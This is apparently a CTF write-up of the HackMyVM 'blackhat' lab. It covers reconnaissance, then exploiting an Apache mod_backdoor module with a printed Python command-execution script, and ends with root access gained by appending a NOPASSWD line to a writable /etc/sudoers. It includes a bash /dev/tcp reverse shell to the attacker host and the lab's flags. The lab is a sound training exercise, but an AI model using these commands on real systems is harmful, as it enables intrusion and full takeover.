### 1. Initial Reconnaissance

First, I used `netdiscover` to identify active hosts on the network. The target machine was identified as `192.168.1.16`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ netdiscover
# ... (output showing 192.168.1.16) ...
```

Next, I performed a comprehensive Nmap scan on the target to identify open ports, services, and their versions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ nmap -sS -sV -sC -Pn --min-rate=1000 --max-retries=2 192.168.1.16 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:59 CDT
Nmap scan report for 192.168.1.16
Host is up (0.00065s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title:  Hacked By HackMyVM
MAC Address: 08:00:27:EC:93:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
```

The Nmap scan revealed that port 80 was open, running Apache httpd 2.4.54 on Debian. The HTTP title was "Hacked By HackMyVM".

### 2. Web Enumeration

I used `gobuster` to enumerate directories and files on the web server, looking for common web content and specific file extensions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ gobuster dir -u http://192.168.1.16 -w ../../wordlists/common.txt -x php,txt
# ... (gobuster output) ...
/index.html           (Status: 200) [Size: 1437]
/phpinfo.php          (Status: 200) [Size: 69318]
/server-status        (Status: 403) [Size: 277]
# ... (gobuster output) ...
```

The `gobuster` scan identified `/phpinfo.php` as an accessible file. I then used `curl` to inspect the main page and the `phpinfo.php` output.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ curl http://192.168.1.16/
# ... (HTML output) ...
    <div style="display:none;">check backboor</div>
# ... (HTML output) ...
```

The `index.html` contained a hidden `div` with the text "check backboor". This hinted at a potential backdoor.

I then checked `phpinfo.php` for any mention of "backdoor".

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ curl http://192.168.1.16/phpinfo.php | grep backdoor -C 20
# ... (phpinfo output) ...
Loaded Modules </td><td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status </td></tr></table>
# ... (phpinfo output) ...
```

The `phpinfo.php` output confirmed that `mod_backdoor` was a loaded Apache module. This was a strong indicator of a backdoor.

### 3. Initial Access (`www-data`)

I searched `searchsploit` for `mod_backdoor` and general "backdoor" exploits. While `mod_backdoor` yielded no direct results, a general search for "backdoor" showed many. However, the `phpinfo.php` output specifically pointed to `mod_backdoor`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ searchsploit mod_backdoor
Exploits: No Results
Shellcodes: No Results

┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ searchsploit backdoor
# ... (many results) ...
```

Knowing `mod_backdoor` was present, I looked for known exploits for it. I found a Python exploit script on GitHub specifically for `Apache-HTTP-Server-Module-Backdoor`. I downloaded it using `wget`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ wget https://raw.githubusercontent.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/refs/heads/main/exploit.py
# ... (download output) ...
```

I then inspected the `exploit.py` script. It sends a `GET` request with a custom `Backdoor` header containing the command to be executed.

```python
import requests
import sys

def exploit(host, port, command):
    headers = {"Backdoor": command}
    url = f"http://{host}:{port}/"
    response = requests.get(url, headers=headers)
    text = response.text
    print(text)

def main():
    if len(sys.argv) != 3:
        print("Usage : ")
        print("\tpython %s [HOST] [PORT]" % (sys.argv[0]))
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        command = input("$ ")
        if command == "exit":
            break
        exploit(host, port, command)

if __name__ == "__main__":
    main()
```

I executed the exploit script, and it provided a command execution interface. I confirmed my user with `id`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ python3 exploit.py 192.168.1.16 80
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I was `www-data`. To get a stable shell, I set up a Netcat listener on my Kali machine and then used the `mod_backdoor` exploit to send a reverse shell command.

**Terminal 2 (Kali Listener):**

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/blackhat]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.16 46644
```

**Terminal 1 (Exploit Script):**

```shellscript
$ /usr/bin/bash -c "bash -i >& /dev/tcp/192.168.1.5/4444 0>&1"
```

After receiving the shell, I upgraded it to a fully interactive TTY using Python.

```shellscript
www-data@blackhat:/$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@blackhat:/$
```

### 4. Local Enumeration (`www-data`)

I started by exploring the file system, particularly the web root and home directories.

```shellscript
www-data@blackhat:/$ ls -la /var/www/html
total 36
drwxr-xr-x 2 root     root      4096 Nov 19  2022 .
drwxr-xr-x 3 root     root      4096 Nov 10  2022 ..
-rw-r--r-- 1 www-data www-data 13314 Nov 11  2022 image.jpg
-rw-r--r-- 1 www-data www-data  1437 Nov 19  2022 index.html
-rw-r--r-- 1 www-data www-data    20 Nov 11  2022 phpinfo.php
-rw-r--r-- 1 www-data www-data  2332 Nov 11  2022 style.css
```

The web root contained the `index.html` and `phpinfo.php` files I had already seen.

Next, I checked the `/home` directory for other users.

```shellscript
www-data@blackhat:/$ ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 Nov 11  2022 .
drwxr-xr-x 18 root      root      4096 Nov 10  2022 ..
drwxr-xr-x  3 darkdante darkdante 4096 Nov 13  2022 darkdantewww-data@blackhat:/home$ cd darkdante
www-data@blackhat:/home/darkdante$ ls -la
total 28
drwxr-xr-x 3 darkdante darkdante 4096 Nov 13  2022 .
drwxr-xr-x 3 root      root      4096 Nov 11  2022 ..
lrwxrwxrwx 1 root      root         9 Nov 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 darkdante darkdante  220 Nov 11  2022 .bash_logout
-rw-r--r-- 1 darkdante darkdante 3526 Nov 11  2022 .bashrc
drwxr-xr-x 3 darkdante darkdante 4096 Nov 11  2022 .local
-rw-r--r-- 1 darkdante darkdante  807 Nov 11  2022 .profile
-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt
```

I found a user named `darkdante` with a `user.txt` file. Interestingly, `darkdante`'s `.bash_history` was symlinked to `/dev/null`, preventing command history from being saved. I couldn't read `user.txt` as `www-data` due to permissions.

I attempted to use `sudo -l` as `www-data`, but it required a password.

```shellscript
www-data@blackhat:/home/darkdante$ sudo -l
[sudo] password for www-data: Sorry, try again.
```

I then uploaded and ran `linpeas.sh` to perform a more thorough privilege escalation enumeration.

```shellscript
www-data@blackhat:/home/darkdante$ wget http://192.168.1.5/linpeas.sh
# ... (download output) ...
www-data@blackhat:/home/darkdante$ chmod +x linpeas.sh
www-data@blackhat:/home/darkdante$ ./linpeas.sh
# ... (linpeas output) ...
```

### 5. Privilege Escalation to `darkdante`

During the enumeration, I noticed that the `www-data` user could `su` to `darkdante` without a password. This is a common misconfiguration or an indication that `darkdante` has a blank password.

```shellscript
www-data@blackhat:/home/darkdante$ su darkdante
darkdante@blackhat:~$ id
uid=1000(darkdante) gid=1000(darkdante) groups=1000(darkdante)
```

I successfully switched to the `darkdante` user. Now, I could read `user.txt`.

```shellscript
darkdante@blackhat:~$ cat user.txt
89fac491dc9bdc5fc4e3595dd396fb11
```

The user flag is `89fac491dc9bdc5fc4e3595dd396fb11`.

### 6. Privilege Escalation to `root`

As `darkdante`, I checked `sudo` permissions.

```shellscript
darkdante@blackhat:~$ sudo -l
Sorry, user darkdante may not run sudo on blackhat.
```

`darkdante` was not allowed to run `sudo`. However, `linpeas.sh` (and manual inspection) revealed interesting permissions on `/etc/sudoers`.

```shellscript
darkdante@blackhat:~$ ls -la /etc/sudoers
-r--rw----+ 1 root root 669 Nov 19  2022 /etc/sudoers

darkdante@blackhat:~$ getfacl /etc/sudoers
getfacl: Removing leading '/' from absolute path names
# file: etc/sudoers
# owner: root
# group: root
user::r--
user:darkdante:rw-
group::r--
mask::rw-
other::---
```

The `getfacl` output clearly showed that `darkdante` had read and write (`rw-`) permissions on `/etc/sudoers` via an Access Control List (ACL). This is a critical misconfiguration, as it allows `darkdante` to modify the `sudoers` file and grant themselves root privileges.

I first made a backup of the original `/etc/sudoers` file (good practice).

```shellscript
darkdante@blackhat:~$ cp /etc/sudoers /tmp/sudoers.bak
```

Then, I appended a line to `/etc/sudoers` to grant `darkdante` NOPASSWD `ALL` privileges.

```shellscript
darkdante@blackhat:~$ echo 'darkdante ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
```

I verified the new `sudo` permissions for `darkdante`.

```shellscript
darkdante@blackhat:~$ sudo -l
Matching Defaults entries for darkdante on blackhat:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User darkdante may run the following commands on blackhat:
    (ALL : ALL) NOPASSWD: ALL
```

With `NOPASSWD: ALL` configured, I could now easily get a root shell.

```shellscript
darkdante@blackhat:~$ sudo su
root@blackhat:/home/darkdante# id
uid=0(root) gid=0(root) groups=0(root)
```

I successfully gained a root shell! Finally, I navigated to `/root` and retrieved the root flag.

```shellscript
root@blackhat:/home/darkdante# cd /root
root@blackhat:~# ls
root.txt
root@blackhat:~# cat root.txt
8cc6110bc1a0607015c354a459468442
```

The root flag is `8cc6110bc1a0607015c354a459468442`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified target IP `192.168.1.16` and open port 80 running Apache 2.4.54.
2. **Web Enumeration:** Discovered `/phpinfo.php` and a hidden "check backboor" message on `index.html`. Confirmed `mod_backdoor` was loaded via `phpinfo.php`.
3. **Initial Access (`www-data`):**

1. Downloaded and used a Python exploit script for `Apache-HTTP-Server-Module-Backdoor` to achieve remote command execution.
2. Used the command execution to establish a reverse shell as `www-data`.
3. Upgraded to a stable TTY shell.



4. **Privilege Escalation to `darkdante`:**

1. Enumerated users and found `darkdante`.
2. Discovered that `www-data` could `su darkdante` without a password.
3. Obtained `user.txt` as `darkdante`.



5. **Privilege Escalation to `root`:**

1. Identified that `darkdante` had write permissions on `/etc/sudoers` via ACLs (`user:darkdante:rw-`).
2. Modified `/etc/sudoers` to grant `darkdante` NOPASSWD `ALL` privileges.
3. Used `sudo su` to gain a root shell.
4. Retrieved `root.txt`.
